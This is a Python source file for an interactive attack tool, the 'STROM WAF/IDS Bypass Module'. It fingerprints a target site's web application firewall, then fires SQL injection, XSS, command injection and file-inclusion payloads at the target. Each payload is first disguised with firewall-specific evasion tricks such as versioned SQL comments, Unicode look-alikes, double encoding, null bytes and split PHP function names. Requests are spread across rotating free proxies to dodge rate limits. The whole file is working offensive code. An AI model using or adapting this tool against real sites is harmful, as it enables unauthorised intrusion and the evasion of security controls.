#!/usr/bin/env python3
import requests
import random
import time
import re
from termcolor import colored
from core.bypass_helper import BypassHelper
from core.payloads import PayloadGenerator
from utils.logger import setup_logger

logger = setup_logger('bypass')

class WAFBypass:
    """Advanced WAF/IDS/IPS Bypass Module"""
    
    def __init__(self):
        self.helper = BypassHelper()
        self.payloads = PayloadGenerator()
        self.session = requests.Session()
        self.waf_detected = None
        self.successful_bypasses = []
        
        # Proxy support
        self.proxies = []
        self.current_proxy_index = 0
        self.use_proxy = False
        
        # Rate limiting
        self.request_count = 0
        self.request_limit = 100
        self.time_window = 60  # seconds
        self.last_reset = time.time()
        
        # WAF signatures for detection
        self.waf_signatures = {
            'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-', 'awselb'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'Akamai': ['akamai', 'ak-bmsc'],
            'Sucuri': ['sucuri', 'x-sucuri'],
            'Wordfence': ['wordfence'],
            'Incapsula': ['incap_ses', '_incapsula'],
            'F5 BIG-IP': ['bigipserver', 'f5'],
            'Barracuda': ['barra_counter_session']
        }
        
        # Bypass techniques mapping
        self.bypass_techniques = {
            'Cloudflare': self._bypass_cloudflare,
            'ModSecurity': self._bypass_modsecurity,
            'AWS WAF': self._bypass_aws_waf,
            'Wordfence': self._bypass_wordfence,
            'Generic': self._bypass_generic
        }
    
    def run(self):
        """Run interactive WAF bypass module"""
        try:
            print(colored("\n[+] STROM WAF/IDS Bypass Module", 'red', attrs=['bold']))
            print(colored("="*60, 'yellow'))
            
            target = input(colored("\n[+] Target URL: ", 'blue'))
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            # Proxy configuration
            use_proxy = input(colored("[?] Use proxy rotation? (y/N): ", 'cyan')).lower()
            if use_proxy == 'y':
                self.configure_proxies()
            
            # Detect WAF
            print(colored("\n[*] Detecting WAF/IDS/IPS...", 'yellow'))
            waf = self.detect_waf(target)
            
            if waf:
                print(colored(f"\n[+] WAF Detected: {waf}", 'red', attrs=['bold']))
                self.waf_detected = waf
            else:
                print(colored("\n[-] No WAF detected or WAF is silent", 'yellow'))
                self.waf_detected = 'Generic'
            
            # Choose attack type
            print(colored("\n[*] Select Attack Type:", 'cyan'))
            print(colored("  1. SQL Injection", 'white'))
            print(colored("  2. XSS (Cross-Site Scripting)", 'white'))
            print(colored("  3. Command Injection", 'white'))
            print(colored("  4. LFI (Local File Inclusion)", 'white'))
            print(colored("  5. Rate Limiting Bypass Test", 'yellow'))  # NEW
            print(colored("  6. CAPTCHA Bypass Analysis", 'yellow'))  # NEW
            print(colored("  7. Custom Payload", 'white'))
            
            choice = input(colored("\n[?] Choice (1-7): ", 'cyan'))
            
            if choice == '1':
                self._bypass_sqli(target)
            elif choice == '2':
                self._bypass_xss(target)
            elif choice == '3':
                self._bypass_rce(target)
            elif choice == '4':
                self._bypass_lfi(target)
            elif choice == '5':
                self._test_rate_limiting(target)  # NEW
            elif choice == '6':
                self._analyze_captcha(target)  # NEW
            elif choice == '7':
                custom = input(colored("[+] Enter custom payload: ", 'blue'))
                self._test_custom_bypass(target, custom)
            
            # Show results
            self._show_results()
            
        except KeyboardInterrupt:
            print(colored("\n[!] Bypass testing interrupted", 'red'))
        except Exception as e:
            logger.error(f"Bypass module error: {str(e)}")
            print(colored(f"[!] Error: {str(e)}", 'red'))
    
    def configure_proxies(self):
        """Configure proxy list"""
        print(colored("\n[*] Proxy Configuration", 'cyan'))
        print(colored("  1. Load from file", 'white'))
        print(colored("  2. Enter manually", 'white'))
        print(colored("  3. Use free proxy API", 'white'))
        
        choice = input(colored("\n[?] Choice (1-3): ", 'blue'))
        
        if choice == '1':
            filename = input(colored("[+] Proxy file path: ", 'blue'))
            try:
                with open(filename, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(colored(f"[+] Loaded {len(self.proxies)} proxies", 'green'))
            except Exception as e:
                print(colored(f"[!] Error loading proxies: {e}", 'red'))
        
        elif choice == '2':
            print(colored("[+] Enter proxies (format: http://ip:port), empty line to finish:", 'cyan'))
            while True:
                proxy = input(colored("Proxy> ", 'blue'))
                if not proxy:
                    break
                self.proxies.append(proxy)
            print(colored(f"[+] Added {len(self.proxies)} proxies", 'green'))
        
        elif choice == '3':
            print(colored("[*] Fetching free proxies from API...", 'yellow'))
            self._fetch_free_proxies()
        
        if self.proxies:
            self.use_proxy = True
            self._test_proxies()
    
    def _fetch_free_proxies(self):
        """Fetch free proxies from API"""
        try:
            # Free proxy list API
            resp = requests.get('https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all')
            proxies = resp.text.strip().split('\r\n')
            self.proxies = [f"http://{p}" for p in proxies if p]
            print(colored(f"[+] Fetched {len(self.proxies)} free proxies", 'green'))
        except Exception as e:
            print(colored(f"[!] Failed to fetch proxies: {e}", 'red'))
    
    def _test_proxies(self):
        """Test proxies and remove dead ones"""
        print(colored("\n[*] Testing proxies...", 'yellow'))
        working_proxies = []
        
        for proxy in self.proxies[:10]:  # Test first 10
            try:
                resp = requests.get('http://httpbin.org/ip', 
                                   proxies={'http': proxy, 'https': proxy}, 
                                   timeout=5)
                if resp.status_code == 200:
                    working_proxies.append(proxy)
                    print(colored(f"[+] Working: {proxy}", 'green'))
            except:
                print(colored(f"[-] Dead: {proxy}", 'red'))
        
        self.proxies = working_proxies
        print(colored(f"\n[+] {len(self.proxies)} working proxies", 'green'))
    
    def get_next_proxy(self):
        """Get next proxy from rotation"""
        if not self.use_proxy or not self.proxies:
            return None
        
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return {'http': proxy, 'https': proxy}
    
    def check_rate_limit(self):
        """Check and handle rate limiting"""
        current_time = time.time()
        
        # Reset counter if time window passed
        if current_time - self.last_reset >= self.time_window:
            self.request_count = 0
            self.last_reset = current_time
        
        # Check if limit reached
        if self.request_count >= self.request_limit:
            wait_time = self.time_window - (current_time - self.last_reset)
            if wait_time > 0:
                print(colored(f"[*] Rate limit reached. Waiting {wait_time:.0f}s...", 'yellow'))
                time.sleep(wait_time)
                self.request_count = 0
                self.last_reset = time.time()
        
        self.request_count += 1
    
    def detect_waf(self, url):
        """Detect WAF/IDS/IPS"""
        try:
            # Test with malicious payload
            test_payload = "' OR '1'='1"
            resp = self.session.get(f"{url}{test_payload}", timeout=5)
            
            # Check headers and response
            headers_str = str(resp.headers).lower()
            body_str = resp.text.lower()
            
            # Check known WAF signatures
            for waf_name, signatures in self.waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in headers_str or sig.lower() in body_str:
                        return waf_name
            
            # Check for generic WAF indicators
            if resp.status_code in [403, 406, 419, 429, 503]:
                blocked_keywords = ['blocked', 'forbidden', 'firewall', 'suspicious', 
                                   'security', 'detected', 'malicious', 'denied']
                if any(keyword in body_str for keyword in blocked_keywords):
                    return "Generic WAF"
            
            return None
            
        except Exception as e:
            logger.debug(f"WAF detection failed: {str(e)}")
            return None
    
    def apply_bypass(self, payload, attack_type='sqli'):
        """Apply appropriate bypass technique"""
        bypass_func = self.bypass_techniques.get(self.waf_detected, self._bypass_generic)
        return bypass_func(payload, attack_type)
    
    def _bypass_generic(self, payload, attack_type):
        """Generic bypass techniques"""
        techniques = [
            self.helper.case_switching,
            self.helper.whitespace_manipulation,
            self.helper.url_encode,
            self.helper.null_byte_injection,
            self.helper.newline_injection
        ]
        
        # Try random technique
        technique = random.choice(techniques)
        bypassed = technique(payload)
        
        # For SQL, add comment insertion
        if attack_type == 'sqli' and random.random() > 0.5:
            bypassed = self.helper.comment_insertion_sql(bypassed)
        
        return bypassed
    
    def _bypass_cloudflare(self, payload, attack_type):
        """Cloudflare-specific bypass"""
        # Cloudflare often checks patterns, use encoding
        bypassed = payload
        
        # Case variation
        bypassed = self.helper.case_switching(bypassed)
        
        # Mixed encoding
        if random.random() > 0.5:
            bypassed = self.helper.mixed_encoding(bypassed)
        
        # Unicode normalization for XSS
        if attack_type == 'xss':
            bypassed = bypassed.replace('script', 'scr\u0131pt')
        
        return bypassed
    
    def _bypass_modsecurity(self, payload, attack_type):
        """ModSecurity-specific bypass"""
        bypassed = payload
        
        # Use MySQL version-specific comments
        if attack_type == 'sqli':
            bypassed = bypassed.replace('SELECT', '/*!50000SELECT*/')
            bypassed = bypassed.replace('UNION', '/*!50000UNION*/')
            bypassed = bypassed.replace('FROM', '/*!50000FROM*/')
        
        # Add newlines
        bypassed = bypassed.replace(' AND ', '%0aAND%0a')
        bypassed = bypassed.replace(' OR ', '%0aOR%0a')
        
        return bypassed
    
    def _bypass_aws_waf(self, payload, attack_type):
        """AWS WAF-specific bypass"""
        # AWS WAF uses managed rules, double encoding works
        bypassed = self.helper.double_url_encode(payload)
        
        # Add whitespace manipulation
        bypassed = self.helper.whitespace_manipulation(bypassed)
        
        return bypassed
    
    def _bypass_wordfence(self, payload, attack_type):
        """Wordfence-specific bypass"""
        bypassed = payload
        
        # Obfuscate PHP functions
        if 'eval' in payload.lower():
            bypassed = bypassed.replace('eval', 'ev'+'al')
        
        if 'base64' in payload.lower():
            bypassed = bypassed.replace('base64', 'bas'+'e64')
        
        # Add null byte
        bypassed = self.helper.null_byte_injection(bypassed)
        
        return bypassed
    
    def _bypass_sqli(self, target):
        """SQL Injection bypass testing"""
        print(colored("\n[*] Testing SQL Injection bypasses...", 'yellow'))
        
        # Get SQL payloads
        sql_payloads = self.payloads.generate_sqli_payloads()[:20]
        
        print(colored(f"[*] Testing {len(sql_payloads)} SQL payloads...", 'cyan'))
        
        for i, payload in enumerate(sql_payloads, 1):
            # Test original payload
            if self._test_payload(target, payload):
                print(colored(f"[+] Payload {i} worked without bypass: {payload[:50]}...", 'green'))
                self.successful_bypasses.append({
                    'type': 'SQLi',
                    'payload': payload,
                    'bypass': 'None (original worked)',
                    'waf': self.waf_detected
                })
                continue
            
            # Try bypass techniques
            print(colored(f"[*] Testing bypass for payload {i}...", 'yellow'), end='\r')
            
            for technique_name in ['case_switching', 'comment_insertion_sql', 'whitespace_manipulation', 
                                   'url_encode', 'double_url_encode']:
                technique = getattr(self.helper, technique_name)
                bypassed = technique(payload)
                
                if self._test_payload(target, bypassed):
                    print(colored(f"[+] Payload {i} bypassed using {technique_name}: {bypassed[:50]}...", 'green'))
                    self.successful_bypasses.append({
                        'type': 'SQLi',
                        'original_payload': payload,
                        'bypassed_payload': bypassed,
                        'bypass_technique': technique_name,
                        'waf': self.waf_detected
                    })
                    break
        
        print(colored(f"\n[+] SQL Injection bypass testing complete", 'green'))
    
    def _bypass_xss(self, target):
        """XSS bypass testing"""
        print(colored("\n[*] Testing XSS bypasses...", 'yellow'))
        
        xss_payloads = self.payloads.generate_xss_payloads()[:15]
        
        print(colored(f"[*] Testing {len(xss_payloads)} XSS payloads...", 'cyan'))
        
        for i, payload in enumerate(xss_payloads, 1):
            if self._test_payload(target, payload):
                print(colored(f"[+] XSS Payload {i} worked: {payload[:50]}...", 'green'))
                self.successful_bypasses.append({
                    'type': 'XSS',
                    'payload': payload,
                    'bypass': 'None',
                    'waf': self.waf_detected
                })
    
    def _bypass_rce(self, target):
        """Command Injection bypass testing"""
        print(colored("\n[*] Testing Command Injection bypasses...", 'yellow'))
        
        rce_payloads = self.payloads.generate_rce_payloads()[:15]
        
        for i, payload in enumerate(rce_payloads, 1):
            for technique_name in ['url_encode', 'double_url_encode', 'newline_injection']:
                technique = getattr(self.helper, technique_name)
                bypassed = technique(payload)
                
                if self._test_payload(target, bypassed):
                    print(colored(f"[+] RCE Payload {i} bypassed: {bypassed[:50]}...", 'green'))
                    self.successful_bypasses.append({
                        'type': 'RCE',
                        'original_payload': payload,
                        'bypassed_payload': bypassed,
                        'bypass_technique': technique_name,
                        'waf': self.waf_detected
                    })
                    break
    
    def _bypass_lfi(self, target):
        """LFI bypass testing"""
        print(colored("\n[*] Testing LFI bypasses...", 'yellow'))
        
        lfi_payloads = self.payloads.generate_lfi_payloads()[:15]
        
        for i, payload in enumerate(lfi_payloads, 1):
            for technique_name in ['url_encode', 'double_url_encode', 'null_byte_injection']:
                technique = getattr(self.helper, technique_name)
                bypassed = technique(payload)
                
                if self._test_payload(target, bypassed):
                    print(colored(f"[+] LFI Payload {i} bypassed: {bypassed[:50]}...", 'green'))
                    self.successful_bypasses.append({
                        'type': 'LFI',
                        'original_payload': payload,
                        'bypassed_payload': bypassed,
                        'bypass_technique': technique_name,
                        'waf': self.waf_detected
                    })
                    break
    
    def _test_custom_bypass(self, target, payload):
        """Test custom payload with all bypass techniques"""
        print(colored("\n[*] Testing custom payload with bypass techniques...", 'yellow'))
        
        # Test original
        if self._test_payload(target, payload):
            print(colored(f"[+] Original payload worked!", 'green'))
            return
        
        # Try all techniques
        techniques = [
            'case_switching', 'comment_insertion_sql', 'whitespace_manipulation',
            'url_encode', 'double_url_encode', 'unicode_encode', 'hex_encode',
            'mixed_encoding', 'null_byte_injection', 'newline_injection'
        ]
        
        for technique_name in techniques:
            technique = getattr(self.helper, technique_name)
            bypassed = technique(payload)
            
            print(colored(f"[*] Trying {technique_name}...", 'yellow'))
            if self._test_payload(target, bypassed):
                print(colored(f"[+] Success with {technique_name}!", 'green'))
                print(colored(f"[+] Bypassed payload: {bypassed}", 'cyan'))
                self.successful_bypasses.append({
                    'type': 'Custom',
                    'original_payload': payload,
                    'bypassed_payload': bypassed,
                    'bypass_technique': technique_name,
                    'waf': self.waf_detected
                })
                return
        
        print(colored("[-] No bypass technique worked for this payload", 'red'))
    
    def _test_payload(self, url, payload):
        """Test if payload bypasses WAF (returns True if bypassed/successful)"""
        try:
            # Check rate limit
            self.check_rate_limit()
            
            # Get proxy if enabled
            proxies = self.get_next_proxy()
            
            resp = self.session.get(f"{url}{payload}", proxies=proxies, timeout=5)
            
            # Check if blocked
            if resp.status_code in [403, 406, 419, 429, 503]:
                return False
            
            blocked_keywords = ['blocked', 'forbidden', 'firewall', 'suspicious']
            if any(keyword in resp.text.lower() for keyword in blocked_keywords):
                return False
            
            # If not blocked, consider it successful
            return True
            
        except Exception as e:
            logger.debug(f"Payload test failed: {str(e)}")
            return False
    
    def _show_results(self):
        """Display bypass test results"""
        print(colored("\n" + "="*60, 'yellow'))
        print(colored("           BYPASS TEST RESULTS", 'cyan', attrs=['bold']))
        print(colored("="*60, 'yellow'))
        
        if not self.successful_bypasses:
            print(colored("\n[-] No successful bypasses found", 'red'))
            return
        
        print(colored(f"\n[+] Total Successful Bypasses: {len(self.successful_bypasses)}", 'green', attrs=['bold']))
        
        # Group by type
        by_type = {}
        for bypass in self.successful_bypasses:
            bypass_type = bypass['type']
            if bypass_type not in by_type:
                by_type[bypass_type] = []
            by_type[bypass_type].append(bypass)
        
        for attack_type, bypasses in by_type.items():
            print(colored(f"\n[{attack_type}] - {len(bypasses)} successful", 'cyan'))
            
            for i, bypass in enumerate(bypasses[:5], 1):  # Show first 5
                print(colored(f"\n  #{i}:", 'white'))
                if 'original_payload' in bypass:
                    print(colored(f"    Original : {bypass['original_payload'][:60]}...", 'yellow'))
                    print(colored(f"    Bypassed : {bypass['bypassed_payload'][:60]}...", 'green'))
                    print(colored(f"    Technique: {bypass['bypass_technique']}", 'cyan'))
                else:
                    print(colored(f"    Payload  : {bypass['payload'][:60]}...", 'green'))
        
        # Offer to save results
        save = input(colored("\n[?] Save results to file? (y/N): ", 'yellow')).lower()
        if save == 'y':
            filename = f"bypass_results_{int(time.time())}.json"
            import json
            with open(filename, 'w') as f:
                json.dump({
                    'waf_detected': self.waf_detected,
                    'total_bypasses': len(self.successful_bypasses),
                    'bypasses': self.successful_bypasses
                }, f, indent=2)
            print(colored(f"[+] Results saved to {filename}", 'green'))

if __name__ == "__main__":
    bypass_module = WAFBypass()
    bypass_module.run()
